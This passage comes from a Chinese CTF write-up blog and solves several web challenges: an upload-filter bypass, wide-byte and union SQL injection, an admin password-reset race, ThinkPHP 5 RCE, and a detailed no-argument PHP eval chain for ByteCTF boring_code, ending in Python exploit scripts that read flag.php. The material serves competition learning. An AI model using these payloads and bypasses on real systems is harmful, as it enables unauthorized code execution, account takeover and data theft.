class="line">                    $img_path = <span class="string">"./upload"</span> . <span class="string">'/'</span> .$file_name;</span><br><span class="line">                    <span class="keyword">if</span> (mb_strpos(file_get_contents($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>]), <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">                        $text = <span class="string">"hacker"</span>;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span>(file_exists($img_path))&#123;</span><br><span class="line">                            $text = <span class="string">"file exist already"</span>;</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="keyword">if</span> (move_uploaded_file($temp_name, $img_path)) &#123;</span><br><span class="line">                                $text = <span class="string">"upload succeed"</span>;</span><br><span class="line">                                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                $text = <span class="string">"upload failed"</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $text = <span class="string">"please upload your file"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>先做个简单测试</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/5-1.png" alt="5-1"></p>
<p>这题的关键点在于<code>move_uploaded_file()</code>函数会自动递归删除最后的<code>/.</code>字符串（或者 Windows 环境下自动删除文件名最后的<code>.</code>）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">move_uploaded_file($temp_name, $img_path)</span><br></pre></td></tr></table></figure>
<p>当我们有传入<code>$_POST[&#39;save_name&#39;]</code>时，并且是一个数组，<code>$file</code>这个变量就可以是一个数组，并且内容随意控制，无需受<code>explode()</code>控制，思路：</p>
<p>① 令数组的最后一个参数为允许的后缀，比如 jpg</p>
<p>② 令<code>$file[count($file) - 1]</code>为空，这样<code>$file_name</code>等于“数组的第一位 + <code>.</code>”，然后我们使数组的第一位为“文件名 + <code>/</code>”，这样传入 move_uploaded_file() 函数中时，就是“文件名 + <code>/.</code>”，后面的<code>/.</code>就会被处理掉。看一下 count() 对数组处理的漏洞，对没有赋值的数组元素不计算，所以可以利用这一点来使得<code>$file[count($file) - 1]</code>为空</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/5-3.png" alt="5-3"></p>
<p>最后结果</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/5-4.png" alt="5-4"></p>
<p>连接后在根目录下拿到 flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/5-5.png" alt="5-5"></p>
<h2 id="光坂镇的小诗1"><a href="#光坂镇的小诗1" class="headerlink" title="光坂镇的小诗1"></a>光坂镇的小诗1</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/6-1.png" alt="6-1"></p>
<p>点击对应的名字发现参数 id 会变，加单引号之后发现会被添加反斜杠转义掉，猜想会不会是<code>宽字节注入</code>，用<code>%df</code>，被解析成一个字符，成功</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/6-2.png" alt="6-2"></p>
<p>邮件查看源码，可以通过<code>img</code>标签的<code>src</code>来注入。发现单引号包裹</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/6-3.png" alt="6-3"></p>
<p>联合注入测试成功</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/6-4.png" alt="6-4"></p>
<p>注表名</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/6-5.png" alt="6-5"></p>
<p>由于不能使用<code>引号</code>，所以这里直接<code>select * from flag</code>，然后用<code>limit</code>输出，拿到 flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/6-6.png" alt="6-6"></p>
<h2 id="NSB-Reset-Password"><a href="#NSB-Reset-Password" class="headerlink" title="NSB_Reset_Password"></a>NSB_Reset_Password</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/7-1.png" alt="7-1"></p>
<p>注册一个普通用户，登录后给了提示</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/7-2.png" alt="7-2"></p>
<p>重置普通用户的密码，果然收到邮件。输入验证码，来到重改密码的界面，先放着</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/7-3.png" alt="7-3"></p>
<p>然后此时再新开一个窗口，回到上一个忘记密码的页面，用户名填写 admin</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/7-5.png" alt="7-5"></p>
<p>然后系统会发送邮件，我们虽然拿不到验证码，但是此时服务器后台更改密码的用户变为 admin。我们此时只要在第一个重新设置密码的界面修改密码，改的就是 admin 的密码</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/7-4.png" alt="7-4"></p>
<p>admin 登陆拿到 flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/7-6.png" alt="7-6"></p>
<h2 id="easy-pentest"><a href="#easy-pentest" class="headerlink" title="easy_pentest"></a>easy_pentest</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/8-1.png" alt="8-1"></p>
<p>根据题目提示<code>thinkphp</code>，扫描 thinkphp 后台日志，果然存在<code>[ip]/runtime/log/201909/02.log</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/8-3.png" alt="8-3"></p>
<p>注意其中有<code>safe_key</code>参数以及它的值，将它们添加到URL中，进入<code>Sage Page</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/8-2.png" alt="8-2"></p>
<p>然后在返回的页面中，看到<code>Think PHP V5</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/8-4.png" alt="8-4"></p>
<p>参考文章：<a href="https://xz.aliyun.com/t/6106#toc-4?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener"> 记一次有趣的tp5代码执行 </a></p>
<p>payload 直接打</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/8-5.png" alt="8-5"></p>
<p>在<code>/home</code>下发现 flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/8-6.png" alt="8-6"></p>
<p><code>file</code>字符串不能用，<code>show_source</code>拿到 flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/8-7.png" alt="8-7"></p>
<hr>
<p><strong>Reference</strong></p>
<p> <a href="https://xz.aliyun.com/t/6106#toc-4?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">https://xz.aliyun.com/t/6106#toc-4?tdsourcetag=s_pcqq_aiomsg</a></p>
<p> <a href="https://xz.aliyun.com/t/6661#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/6661#toc-10</a> </p>
<hr>
<p><strong>WriteUp</strong></p>
<p> <a href="https://www.ctfwp.com/articals/2019unctf.html" target="_blank" rel="noopener">https://www.ctfwp.com/articals/2019unctf.html</a> </p>
<h1 id="第五届上海市大学生网络安全大赛"><a href="#第五届上海市大学生网络安全大赛" class="headerlink" title="第五届上海市大学生网络安全大赛"></a>第五届上海市大学生网络安全大赛</h1><p>时间：2019年11月2号</p>
<p>记录 4 道 Web 题目（其中一道为 Bytectf boring_code）</p>
<h2 id="Bytectf-boring-code"><a href="#Bytectf-boring-code" class="headerlink" title="Bytectf boring_code"></a>Bytectf boring_code</h2><p>因为 <code>decade</code> 这道题涉及到 boring_code 的知识点，所以决定在本文章中复现一下这道题目</p>
<p><strong>题目源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/data:\/\//i'</span>, $url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>Bypass 第一层</strong></p>
<p>第一层关键过滤代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">filter_var($url, FILTER_VALIDATE_URL)</span><br><span class="line"></span><br><span class="line">preg_match(<span class="string">'/data:\/\//i'</span>, $url)</span><br><span class="line"></span><br><span class="line">parse_url($url)</span><br><span class="line"></span><br><span class="line">preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>绕过<code>filter_var()</code>和<code>preg_match()</code>函数的文章看这篇： <a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">https://www.jianshu.com/p/80ce73919edb</a></p>
<p>filter_var()</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/4-1.png" alt="4-1"></p>
<p>parse_url</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/4-2.png" alt="4-2"></p>
<p>本题正确方法如下：</p>
<blockquote>
<p>① 氪金，购买一个含有 baidu.com 的域名</p>
<p>② 使用 ftp 协议： <a href="ftp://ip:port,baidu.com:80/filename.txt" target="_blank" rel="noopener">ftp://ip:port,baidu.com:80/filename.txt</a></p>
<p>③ 使用一个百度的任意跳转的漏洞，具体可以参考 ：<a href="https://www.4xseo.com/marketing/1280/#title-0" target="_blank" rel="noopener">https://www.4xseo.com/marketing/1280/#title-0</a></p>
<p>④  compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime(time(</p>
<p>chdir(next(scandir(pos(localeconv()))))))))))));</p>
</blockquote>
<p><code>$code</code>的值通过<code>file_get_content()</code>函数获取，而它正是<code>eval()</code>的参数，所以我们才要想尽办法绕过第一层把这个 $code 送进去 eval() 函数内。上面提到的4种方法中，氪金当然是最简单直接地，但是如果不氪金，选择第4种方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>
<p>首先需要注意的是，这里用的是<code>data:@</code>，而不是<code>data://</code>，但是两者却有一样的效果，也就是等同。所以这样可以绕过对<code>data://</code>的正则匹配</p>
<p>然后看一下<code>filter_var()</code>、<code>parse_url()</code>、<code>file_get_content()</code>对它的处理</p>
<p>filter_var()</p>
<p>为什么这里还要用<code>compress.zlib://</code>呢，因为<code>filter_var()</code>不同意<code>data:@</code>（虽然它等同于<code>data://</code>）。但是加上 compress.zlib:// 就同意了，也算是一种绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(filter_var(<span class="string">"data:@baidu.com/baidu.com?,echo(readfile(end</span></span><br><span class="line"><span class="string">(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));"</span>, FILTER_VALIDATE_URL));</span><br><span class="line">bool(<span class="keyword">false</span>)</span><br><span class="line"></span><br><span class="line">php &gt; var_dump(filter_var(<span class="string">"data://baidu.com/baidu.com?,echo(readfile(end</span></span><br><span class="line"><span class="string">(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));"</span>, FILTER_VALIDATE_URL));</span><br><span class="line">string(<span class="number">125</span>) <span class="string">"data://baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime</span></span><br><span class="line"><span class="string">(time(chdir(next(scandir(pos(localeconv()))))))))))));"</span></span><br><span class="line"></span><br><span class="line">php &gt; var_dump(filter_var(<span class="string">"compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end</span></span><br><span class="line"><span class="string">(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));"</span>, FILTER_VALIDATE_URL));</span><br><span class="line">string(<span class="number">140</span>) <span class="string">"compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime</span></span><br><span class="line"><span class="string">(time(chdir(next(scandir(pos(localeconv()))))))))))));"</span></span><br></pre></td></tr></table></figure>
<p>parse_url()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(parse_url(<span class="string">"compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end</span></span><br><span class="line"><span class="string">(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));"</span>));</span><br><span class="line"><span class="keyword">array</span>(<span class="number">6</span>) &#123;</span><br><span class="line">  [<span class="string">"scheme"</span>]=&gt;</span><br><span class="line">  string(<span class="number">13</span>) <span class="string">"compress.zlib"</span></span><br><span class="line">  [<span class="string">"host"</span>]=&gt;</span><br><span class="line">  string(<span class="number">9</span>) <span class="string">"baidu.com"</span></span><br><span class="line">  [<span class="string">"user"</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"data"</span></span><br><span class="line">  [<span class="string">"pass"</span>]=&gt;</span><br><span class="line">  string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">  [<span class="string">"path"</span>]=&gt;</span><br><span class="line">  string(<span class="number">10</span>) <span class="string">"/baidu.com"</span></span><br><span class="line">  [<span class="string">"query"</span>]=&gt;</span><br><span class="line">  string(<span class="number">98</span>) <span class="string">",echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>file_get_contents()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span>(file_get_contents(<span class="string">"compress.zlib://data:@baidu.com/baidu.com?,</span></span><br><span class="line"><span class="string">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));"</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>
<p>从结果可以看到，该payload：①通过了 filter_var() 的检查；②通过了关于 data:// 的正则匹配；③用过了经过 parse_url() 函数处理后，host 参数匹配 baidu.com 的检查；④在经过 file_get_contents() 函数处理后，为 $code 参数赋值</p>
<p>太强了</p>
<p><strong>Bypass 第二层</strong></p>
<p>第二层关键过滤代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)</span><br><span class="line"></span><br><span class="line">preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>首先解释一下<code>(?R)?</code>，这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数）</p>
<p>只能使用包含<code>a-z</code>字母加<code>括号()</code>的函数（比如 var_dump() 就不能用了），然后必须无参数</p>
<p>无参数的意思是：<code>所使用的的函数不得传入参数</code>，比如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span>(<span class="string">"999"</span>)</span><br></pre></td></tr></table></figure>
<p>其中<code>999</code>就是 echo 函数的参数，而在本题中这样是不行的，但是却可以：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span>(time())</span><br></pre></td></tr></table></figure>
<p>也就是函数中再嵌套一个函数，这样在本题中确实被允许的，所以就利用这一点</p>
<p>[+]</p>
<p>接下来直接看着 payload 来学习，如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span>(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>
<p>因为题目中给了如下提示</p>
<blockquote>
<p>flag in this file and code in /code</p>
</blockquote>
<p>也就是说 flag 在<code>/www/</code>目录下，而我们当前的目录是<code>/www/code</code>，所以要切换到上一级并读取 flag</p>
<p><code>① localeconv()函数</code></p>
<p>作用：返回一个包含本地数字及货币格式信息的数组</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(localeconv());</span><br><span class="line"><span class="keyword">array</span>(<span class="number">18</span>) &#123;</span><br><span class="line">  [<span class="string">"decimal_point"</span>]=&gt;</span><br><span class="line">  string(<span class="number">1</span>) <span class="string">"."</span></span><br><span class="line">  [<span class="string">"thousands_sep"</span>]=&gt;</span><br><span class="line">  string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">  [<span class="string">"int_curr_symbol"</span>]=&gt;</span><br><span class="line">  string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>可以看到，该函数返回的是一个<code>数组</code>，并且数组的第一个元素为字符串的<code>点（.）</code></p>
<p><code>② pos()函数</code></p>
<p>作用： 返回数组中的当前元素的值</p>
<p>因为正则条件中有<code>nt</code>，所以<code>current()</code>函数就无法使用，但是它有一个别名，就是<code>pos()</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(pos(localeconv()));</span><br><span class="line">string(<span class="number">1</span>) <span class="string">"."</span></span><br></pre></td></tr></table></figure>
<p><code>③ scandir()函数</code></p>
<p>作用： 返回指定目录中的文件和目录的数组</p>
<p>前面 pos() 函数输出的值为<code>点（.）</code>，所以这里变成<code>scandir(.)</code>，也就是当前目录</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(scandir(pos(localeconv())));</span><br><span class="line"><span class="keyword">array</span>(<span class="number">6</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">1</span>) <span class="string">"."</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  string(<span class="number">2</span>) <span class="string">".."</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  string(<span class="number">8</span>) <span class="string">"code.php"</span></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>④ next()函数</code></p>
<p>作用： 将数组中的内部指针向前移动一位</p>
<p>在刚才 scandir() 函数返回的数组中，第一位是点（.），此时指针默认指向该位（也就是第一位），通过<code>next()</code>函数，将指针移动到下一位，也就是<code>点点（..）</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(next(scandir(pos(localeconv()))));</span><br><span class="line">string(<span class="number">2</span>) <span class="string">".."</span></span><br></pre></td></tr></table></figure>
<p><code>⑤ chdir()函数</code></p>
<p>作用：改变目录</p>
<p>next() 函数返回点点（..），<code>chdir()</code>函数执行 chdir(..) 也就把目录切换到了上一级</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(chdir(next(scandir(pos(localeconv())))));</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure>
<p>返回 bool 类型的 true ，说明当前目录切换成功</p>
<p><code>⑥ time()函数</code></p>
<p>作用：  返回自从 Unix 纪元（格林威治时间 1970 年 1 月 1 日 00:00:00）到当前时间的秒数</p>
<p>chdir() 函数返回的是 bool 类型的 true ，所以对不需要传入参数的<code>time()</code>函数来说，本来就没有影响，可以正常执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(time(chdir(next(scandir(pos(localeconv()))))));</span><br><span class="line">int(<span class="number">1572952610</span>)</span><br></pre></td></tr></table></figure>
<p><code>⑦ localtime()函数</code></p>
<p>作用： 取得本地时间</p>
<p><code>localtime()函数</code>可以接受参数，并且第一个参数可以直接接受<code>time()</code>，所以直接利用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">localtime ([ int $timestamp = time() [, bool $is_associative = <span class="keyword">false</span> ]] ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(localtime(time(chdir(next(scandir(pos(localeconv())))))));</span><br><span class="line"><span class="keyword">array</span>(<span class="number">9</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  int(<span class="number">52</span>)</span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  int(<span class="number">15</span>)</span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>返回的数组中，第一个参数是当前系统的<code>秒数</code>，0 到 59 </p>
<p><code>⑧ pos()函数</code></p>
<p>不多说了，获取第一个参数，也就是系统当前的秒数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))));</span><br><span class="line">int(<span class="number">14</span>)</span><br></pre></td></tr></table></figure>
<p><code>⑨ chr()函数</code></p>
<p>作用： 返回相对应于 <code>ascii</code> 所指定的单个字符</p>
<p><code>chr()</code>函数在这里什么作用呢？因为当秒数为46时，<code>chr(46)=&quot;.&quot;</code>，用来获取<code>点（.）</code>（这里不能再用 localeconv() 函数是因为它不能传入参数）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))));</span><br><span class="line">string(<span class="number">1</span>) <span class="string">"."</span></span><br></pre></td></tr></table></figure>
<p><code>⑩ scandir()函数</code></p>
<p>继续扫描当前目录（默认目录得上一级，因为我们刚才已经 chdir(“..”) 切换过）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))));</span><br><span class="line"><span class="keyword">array</span>(<span class="number">6</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">1</span>) <span class="string">"."</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  string(<span class="number">2</span>) <span class="string">".."</span></span><br><span class="line">      </span><br><span class="line">  ...</span><br><span class="line">      </span><br><span class="line">  [<span class="number">5</span>]=&gt;</span><br><span class="line">  string(<span class="number">8</span>) <span class="string">"flag.php"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>①① end()函数</code></p>
<p>作用： 将 <code>array</code> 的内部指针移动到最后一个单元并返回其值</p>
<p>scandir() 返回当前目录的数组，<code>end()</code>函数将指针移动到最后一个（这里就是 flag.php ，因为文件名按字母先后排序，而字母 <code>f</code> 在本题中排最后）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))));</span><br><span class="line">string(<span class="number">8</span>) <span class="string">"flag.php"</span></span><br></pre></td></tr></table></figure>
<p><code>①② readfile()函数</code></p>
<p>作用： 读取文件并写入到输出缓冲</p>
<p>这里将执行<code>readfile(&quot;flag.php&quot;)</code>，将 flag.php 的内容读取出来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br><span class="line">flag&#123;Byctf_Borning_Code_Test&#125;</span><br><span class="line">int(<span class="number">30</span>)</span><br></pre></td></tr></table></figure>
<p><code>①③ echo()函数</code></p>
<p>最后用<code>echo()</code>函数将 flag 输出</p>
<p><strong>测试复现</strong></p>
<p>这里先做一下第二层 Bypass 的复现，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_POST[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>($code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>EXP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://172.31.19.207/"</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">"code"</span>:<span class="string">"echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	response = requests.post(url,data=data)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> response.text:</span><br><span class="line">		print(response.text)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/4-3.png" alt="4-3"></p>
<p>完整题目的 EXP 如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://172.31.19.207/"</span></span><br><span class="line"></span><br><span class="line">data = &#123;	<span class="string">"url"</span>:<span class="string">"compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	response = requests.post(url,data=data)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> response.text:</span><br><span class="line">		print(response.text)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
